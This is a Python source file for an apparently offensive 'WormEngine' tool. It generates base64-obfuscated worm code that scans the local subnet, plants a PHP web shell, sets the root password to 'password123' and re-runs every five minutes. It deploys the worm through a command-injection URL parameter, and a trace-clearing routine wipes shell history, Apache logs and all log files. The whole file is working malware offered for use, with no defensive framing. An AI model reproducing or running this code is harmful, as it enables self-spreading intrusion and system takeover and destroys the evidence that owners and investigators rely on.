import base64
import random
import time
import requests
from urllib.parse import quote

class WormEngine:
    def __init__(self, socketio=None):
        self.sio = socketio

    def _log(self, msg, type='info'):
        if self.sio:
            self.sio.emit('log', {'msg': f'🐛 {msg}', 'type': type})

    def generate_worm_code(self):
        code = """
import os, socket, requests, time, random, threading, concurrent.futures
def scan(ip):
    for port in [22,80,443,445,3389,5000,8080,8443,9000]:
        try:
            s=socket.socket();s.settimeout(0.5)
            if s.connect_ex((ip,port))==0:
                return {'ip':ip,'port':port}
            s.close()
        except: pass
    return None
def attack(ip, port):
    try:
        requests.get(f"http://{ip}:{port}/?cmd=echo '<?php system($_GET[c]);?>' > /var/www/html/shell.php", timeout=1)
        requests.get(f"http://{ip}:{port}/?cmd=echo 'root:password123' | chpasswd", timeout=1)
    except: pass
def main():
    s=socket.socket();s.connect(("8.8.8.8",80));local=s.getsockname()[0];s.close()
    net='.'.join(local.split('.')[:-1])+'.'
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as e:
        futures=[e.submit(scan, net+str(i)) for i in range(1,255)]
        for f in concurrent.futures.as_completed(futures):
            r=f.result()
            if r: attack(r['ip'], r['port'])
if __name__=="__main__":
    while True:
        main()
        time.sleep(300)
"""
        return base64.b64encode(code.encode()).decode()

    def deploy(self, base_url):
        worm = self.generate_worm_code()
        cmds = [
            f"echo '{worm}' | base64 -d > /tmp/w.py && python3 /tmp/w.py &",
            f"echo '{worm}' | base64 -d > /var/tmp/w.py && python3 /var/tmp/w.py &"
        ]
        deployed = False
        for cmd in cmds:
            try:
                requests.get(f"{base_url}/?cmd={quote(cmd)}", timeout=2, verify=False)
                self._log('💥 Worm deployed!', 'critical')
                deployed = True
                break
            except:
                continue
        return deployed

    def clear_traces(self, base_url):
        cmds = [
            'history -c && rm -f ~/.bash_history',
            'rm -rf /var/log/*.log 2>/dev/null',
            'rm -rf /var/log/apache2/* 2>/dev/null',
            'rm -rf /root/.bash_history 2>/dev/null',
            'rm -rf /tmp/w.py /var/tmp/w.py 2>/dev/null',
            'find / -name "*.log" -exec rm -rf {} \\; 2>/dev/null'
        ]
        try:
            for cmd in cmds:
                requests.get(f"{base_url}/?cmd={quote(cmd)}", timeout=2, verify=False)
            self._log('🧹 All traces removed!', 'success')
            return True
        except:
            return False
